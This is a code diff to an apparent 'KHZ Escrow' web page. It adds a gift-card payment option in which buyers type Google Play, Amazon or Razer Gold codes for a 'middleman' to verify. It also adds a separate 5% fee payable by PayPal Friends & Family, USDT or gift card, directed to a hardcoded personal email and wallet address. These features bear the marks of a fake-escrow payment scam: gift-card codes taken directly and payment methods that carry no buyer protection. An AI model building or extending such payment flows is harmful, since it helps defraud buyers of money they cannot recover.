@@ -1528,100 +1528,114 @@ if (paymentMethod === "USDT") {
   formattedPaymentMethod = "USDT (TRC20)";
 }
 
-// 🔥 MENSAJE PREMIUM AUTOMÁTICO
-
+// AUTOMATIC PAYMENT MESSAGE
 let paymentDetailsHTML = "";
+let feeDetailsHTML = "";
 
-// PAYPAL
+// MAIN PAYMENT: PAYPAL (existing instructions preserved)
 if (paymentMethod === "PAYPAL_FF") {
   paymentDetailsHTML = `
   <div class="payment-details">
-
-  <p style="font-size:13px;color:#94a3b8;margin-bottom:6px;">
-    📧 PayPal Account
-  </p>
-
-  <div class="wallet-box" style="display:flex;flex-direction:column;align-items:center;gap:10px;">
-
-  <span id="paypalEmail"
-  style="
-    color:#4dff88;
-    font-weight:700;
-    white-space:nowrap;
-    word-break:normal;
-  ">
-    paufly1985@gmail.com
-  </span>
-
-  <button id="copyPaypalBtn" class="copy-btn">
-    Copy
-  </button>
-
-</div>
-  
-  <p class="important">
-    ⚠️ IMPORTANT: Payment MUST be sent via
-    <u>PayPal Friends & Family</u>.
-  </p>
-
-</div>
-  `;
+    <p style="font-size:13px;color:#94a3b8;margin-bottom:6px;">📧 PayPal Account</p>
+    <div class="wallet-box" style="display:flex;flex-direction:column;align-items:center;gap:10px;">
+      <span id="paypalEmail" style="color:#4dff88;font-weight:700;white-space:nowrap;word-break:normal;">paufly1985@gmail.com</span>
+      <button id="copyPaypalBtn" class="copy-btn">Copy</button>
+    </div>
+    <p class="important">⚠️ IMPORTANT: Payment MUST be sent via <u>PayPal Friends & Family</u>.</p>
+  </div>`;
 }
 
-// USDT TRC20
+// MAIN PAYMENT: USDT TRC20 (existing instructions preserved)
 if (paymentMethod === "USDT") {
   paymentDetailsHTML = `
   <div class="payment-details">
-
-    <p style="font-size:13px;color:#94a3b8;margin-bottom:6px;">
-      💲 USDT (TRC20) Wallet Address
-    </p>
-
+    <p style="font-size:13px;color:#94a3b8;margin-bottom:6px;">💲 USDT (TRC20) Wallet Address</p>
     <div class="wallet-box">
       <span id="usdtWallet">TExwgT3Ps34w1a3A7ksxwcU82Vauw7G2Df</span>
       <button id="copyWalletBtn" class="copy-btn">Copy</button>
     </div>
-
-    <p style="
-      margin-top:12px;
-      font-size:13px;
-      color:#facc15;
-      font-weight:600;
-    ">
-      ⚠ Send ONLY USDT via TRC20 network.
-      Sending from another network may result in permanent loss.
-    </p>
-
-  </div>
-  `;
+    <p style="margin-top:12px;font-size:13px;color:#facc15;font-weight:600;">⚠ Send ONLY USDT via TRC20 network. Sending from another network may result in permanent loss.</p>
+  </div>`;
 }
 
+// MAIN PAYMENT: GIFT CARD selected by buyer
+if (paymentMethod === "GIFT_CARD") {
+  paymentDetailsHTML = `
+  <div class="payment-details" style="border:1px solid #34466b;border-radius:12px;padding:14px;margin-top:12px;">
+    <p style="font-size:14px;font-weight:800;margin:0 0 6px;color:#e6ebf2;">🎁 KHZ Gift Card Payment</p>
+    <p style="font-size:13px;color:#9aa4b2;margin:0 0 12px;">Selected card: <strong style="color:#2bd4bd;">${giftCardBrand}</strong></p>
+    <label for="mainGiftCardCode" style="display:block;font-size:12px;color:#9aa4b2;margin-bottom:6px;">Gift Card Code</label>
+    <input id="mainGiftCardCode" class="chat-input" type="text" placeholder="Enter ${giftCardBrand} code" autocomplete="off" style="width:100%;box-sizing:border-box;margin-bottom:10px;" />
+    <p style="font-size:12px;color:#9aa4b2;margin:0;">Submit the code directly to the middleman for verification before proceeding.</p>
+  </div>`;
+}
+
+// SEPARATE SERVICE FEE: show only the 5% fee and its selected payment method
+if (paymentMethod === "GIFT_CARD") {
+  const formattedFeeMethod = feePaymentMethod === "PAYPAL_FF"
+    ? "PayPal (Friends & Family)"
+    : feePaymentMethod === "USDT"
+      ? "USDT (TRC20)"
+      : feePaymentMethod === "GIFT_CARD"
+        ? `Gift Card (${feeGiftCardBrand})`
+        : feePaymentMethod;
+
+  if (feePaymentMethod === "PAYPAL_FF") {
+    feeDetailsHTML = `
+    <div class="payment-details" style="border:1px solid #34466b;border-radius:12px;padding:14px;margin-top:12px;">
+      <p style="font-size:14px;font-weight:800;margin:0 0 8px;">💳 Service Fee Payment</p>
+      <p><strong>Method:</strong> ${formattedFeeMethod}</p>
+      <p><strong>Service Fee (5%):</strong> ${pricing.fee} ${currency}</p>
+      <p style="font-size:13px;color:#94a3b8;margin-bottom:6px;">📧 PayPal Account</p>
+      <div class="wallet-box" style="display:flex;flex-direction:column;align-items:center;gap:10px;">
+        <span id="feePaypalEmail" style="color:#4dff88;font-weight:700;white-space:nowrap;word-break:normal;">paufly1985@gmail.com</span>
+        <button id="copyFeePaypalBtn" class="copy-btn">Copy</button>
+      </div>
+      <p class="important">⚠️ Send the service fee via PayPal Friends &amp; Family only.</p>
+    </div>`;
+  } else if (feePaymentMethod === "USDT") {
+    feeDetailsHTML = `
+    <div class="payment-details" style="border:1px solid #34466b;border-radius:12px;padding:14px;margin-top:12px;">
+      <p style="font-size:14px;font-weight:800;margin:0 0 8px;">💳 Service Fee Payment</p>
+      <p><strong>Method:</strong> ${formattedFeeMethod}</p>
+      <p><strong>Service Fee (5%):</strong> ${pricing.fee} ${currency}</p>
+      <p style="font-size:13px;color:#94a3b8;margin-bottom:6px;">💲 USDT (TRC20) Wallet Address</p>
+      <div class="wallet-box">
+        <span id="feeUsdtWallet">TExwgT3Ps34w1a3A7ksxwcU82Vauw7G2Df</span>
+        <button id="copyFeeWalletBtn" class="copy-btn">Copy</button>
+      </div>
+      <p style="margin-top:12px;font-size:13px;color:#facc15;font-weight:600;">⚠ Send ONLY USDT via TRC20 network.</p>
+    </div>`;
+  } else if (feePaymentMethod === "GIFT_CARD") {
+    feeDetailsHTML = `
+    <div class="payment-details" style="border:1px solid #34466b;border-radius:12px;padding:14px;margin-top:12px;">
+      <p style="font-size:14px;font-weight:800;margin:0 0 8px;">🎁 Service Fee Gift Card</p>
+      <p><strong>Method:</strong> ${formattedFeeMethod}</p>
+      <p><strong>Service Fee (5%):</strong> ${pricing.fee} ${currency}</p>
+      <label for="feeGiftCardCode" style="display:block;font-size:12px;color:#9aa4b2;margin-bottom:6px;">${feeGiftCardBrand} Gift Card Code</label>
+      <input id="feeGiftCardCode" class="chat-input" type="text" placeholder="Enter ${feeGiftCardBrand} code for the fee" autocomplete="off" style="width:100%;box-sizing:border-box;margin-bottom:10px;" />
+      <p style="font-size:12px;color:#9aa4b2;margin:0;">Submit the code directly to the middleman for verification.</p>
+    </div>`;
+  }
+}
 
 const premiumMessage = `
 <div class="escrow-box">
-
   <h3>👑 KHZ Escrow – Payment Instructions</h3>
-
   <div class="escrow-section">
     <p><strong>📦 Product Name:</strong> ${name}</p>
     <p><strong>📝 Description:</strong> ${description}</p>
   </div>
-
   <div class="escrow-section">
-    <p><strong>💳 Payment Method:</strong> ${formattedPaymentMethod}</p>
+    <p><strong>💳 Main Payment Method:</strong> ${paymentMethod === "GIFT_CARD" ? `Gift Card (${giftCardBrand})` : formattedPaymentMethod}</p>
     <p><strong>💰 Base Price:</strong> ${pricing.base} ${currency}</p>
     <p><strong>Service Fee (5%):</strong> ${pricing.fee} ${currency}</p>
-    <p class="total"><strong>Total to Pay:</strong> ${pricing.total} ${currency}</p>
+    <p class="total"><strong>Total Value:</strong> ${pricing.total} ${currency}</p>
   </div>
-
   ${paymentDetailsHTML}
-
-  <p class="notice">
-    After completing the payment, please upload the payment proof below to continue the transaction.
-  </p>
-
-</div>
-`;
+  ${feeDetailsHTML}
+  <p class="notice">Please follow the instructions for each payment method. The middleman must verify the Gift Card before the transaction proceeds.</p>
+</div>`;
 
 const { error: msgError } = await supabase
   .from("messages")
@@ -2586,6 +2600,20 @@ document.addEventListener("click", function(e) {
     });
   }
 
+  // Separate service-fee copy buttons
+  const copyTargets = {
+    copyFeeWalletBtn: "feeUsdtWallet",
+    copyFeePaypalBtn: "feePaypalEmail"
+  };
+  if (e.target && copyTargets[e.target.id]) {
+    const valueEl = document.getElementById(copyTargets[e.target.id]);
+    if (!valueEl) return;
+    navigator.clipboard.writeText(valueEl.innerText).then(() => {
+      e.target.innerText = "Copied ✓";
+      setTimeout(() => { e.target.innerText = "Copy"; }, 2000);
+    }).catch(() => alert("Copy failed"));
+  }
+
 });
 // =====================
 // IMAGE MODAL (FUERA DEL DOMContentLoaded)
@@ -3089,7 +3117,7 @@ loadReviews();
     <option value="Google Play">Google Play</option>
     <option value="Amazon">Amazon</option>
     <option value="Razer Gold">Razer Gold</option>
-    <option value="Binance">Binance</option>
+    <option value="Other">Other</option>
   </select>
 
   <div style="background:#121826;border:1px solid #293449;border-radius:12px;padding:12px;margin-top:10px;">
@@ -3119,7 +3147,7 @@ loadReviews();
         <option value="Google Play">Google Play</option>
         <option value="Amazon">Amazon</option>
         <option value="Razer Gold">Razer Gold</option>
-        <option value="Binance">Binance</option>
+        <option value="Other">Other</option>
       </select>
     </div>
   </div>
